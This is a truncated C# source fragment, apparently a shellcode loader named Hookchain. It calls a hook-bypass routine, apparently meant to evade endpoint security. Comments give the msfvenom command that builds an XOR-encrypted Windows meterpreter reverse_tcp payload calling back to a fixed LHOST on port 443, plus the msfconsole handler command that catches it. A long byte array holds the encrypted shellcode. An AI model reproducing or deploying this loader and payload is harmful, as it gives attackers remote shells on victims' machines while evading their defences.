...
class Hookchain
{
    ...
    public static void Main()
    {
        ...
        BypassHook();
        // msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.224.128 LPORT=443 -f csharp -v encryptedShellcode --encrypt xor --encrypt-key 'CHANGEMYKEY'
        // sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.224.128; set LPORT 443; exploit"
        byte[] encryptedShellcode = new byte[354] {0xbf,0xa0,0xce,
            ...
            ,
...
0x0e,0xc0,0x07,0x65,0x42,0x98,0xca,0x0e,0x3f,0xc0,0x8d,0x2d,
0x07,0x44,0x89,0xc8,0x10,0x61,0x4f,0x94,0xce,0x05,0x41,0x1b,
0xc0,0x90,0x37,0x74,0x70,0xb1,0x0e,0xce,0x79,0xd2,0x4a,0x93,
0x68,0x83,0x89,0x8e,0x43,0xeb,0x44,0x8a,0x61,0xab,0x30,0xad,
0x40,0x35,0xb9,0x75,0x3a,0x61,0x38,0xb9,0x13,0xce,0x01,0x67,
0x49,0x92,0x28,0xcc,0x49,0x06,0xd2,0x13,0x59,0x58,0x90,0xc3,
0x45,0xc5,0x46,0x95,0xc4,0x1d,0x6f,0x61,0x02,0x18,0x29,0x18,
0x14,0x16,0xba,0xad,0x01,0x14,0x1f,0xd2,0x51,0xa1,0xc1,0xb1,
